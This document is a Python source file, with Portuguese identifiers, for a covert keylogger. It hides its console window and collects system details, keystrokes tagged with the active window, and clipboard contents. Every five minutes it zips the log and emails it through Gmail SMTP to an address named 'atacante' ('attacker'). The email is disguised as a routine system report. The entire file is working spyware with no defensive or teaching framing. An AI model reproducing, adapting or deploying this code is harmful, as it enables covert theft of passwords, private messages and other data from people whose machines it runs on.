import os
import platform
import socket
import uuid
import getpass
import time
import threading
from datetime import datetime
from pynput import keyboard
import pyperclip
import smtplib
import ssl
from email.message import EmailMessage
from zipfile import ZipFile
import shutil

# Configurações
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.txt")
ZIP_PASSWORD = b"minhaSenha123"
CLIPBOARD_CHECK_INTERVAL = 10
EMAIL_INTERVAL = 300

EMAIL_SENDER = "loggerbot@gmail.com"
EMAIL_PASSWORD = "senha-de-app"
EMAIL_RECEIVER = "atacante@protonmail.com"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def hide_console():
    if platform.system() == "Windows":
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            ctypes.windll.kernel32.CloseHandle(whnd)

def dump_system_info():
    info = {
        "OS": platform.system() + " " + platform.release(),
        "Hostname": socket.gethostname(),
        "IP": socket.gethostbyname(socket.gethostname()),
        "MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1]),
        "User": getpass.getuser(),
    }
    with open(LOG_FILE, "a") as f:
        f.write("=== INFORMAÇÕES DO SISTEMA ===\n")
        for k, v in info.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")

def get_active_window_title():
    try:
        if platform.system() == "Windows":
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif platform.system() == "Darwin":
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        elif platform.system() == "Linux":
            import subprocess
            return subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"]).decode().strip()
    except:
        return "Janela desconhecida"

last_window = ""
def on_press(key):
    global last_window
    window = get_active_window_title()
    if window != last_window:
        with open(LOG_FILE, "a") as f:
            f.write(f"\n[{datetime.now()}] > Janela ativa: {window}\n")
        last_window = window

    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    if "Key." not in key_str or key_str in ["Key.enter", "Key.tab", "Key.space", "Key.backspace"]:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key_str} ")
        if key_str == "Key.enter":
            with open(LOG_FILE, "a") as f:
                f.write("\n")

def log_clipboard():
    prev_data = ""
    while True:
        try:
            data = pyperclip.paste()
            if data != prev_data:
                with open(LOG_FILE, "a") as f:
                    f.write(f"\n[Clipboard] {data}\n")
                prev_data = data
        except:
            pass
        time.sleep(CLIPBOARD_CHECK_INTERVAL)

def compactar_log():
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    zip_path = os.path.join(LOG_DIR, f"log_{timestamp}.zip")
    with ZipFile(zip_path, 'w') as zipf:
        zipf.write(LOG_FILE, arcname="keystrokes.txt")
    return zip_path

def enviar_email(zip_file_path):
    msg = EmailMessage()
    msg["Subject"] = "Relatório diário do sistema"
    msg["From"] = EMAIL_SENDER
    msg["To"] = EMAIL_RECEIVER
    msg.set_content("Segue o relatório automático gerado pelo sistema. Em anexo: logs criptografados.")

    with open(zip_file_path, "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="zip", filename=os.path.basename(zip_file_path))

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)

def send_logs():
    while True:
        try:
            zip_path = compactar_log()
            enviar_email(zip_path)

            open(LOG_FILE, "w").close()
            os.remove(zip_path)
        except Exception as e:
            print("Falha no envio de e-mail:", e)

        time.sleep(EMAIL_INTERVAL)

if __name__ == "__main__":
    hide_console()
    dump_system_info()
    threading.Thread(target=log_clipboard, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
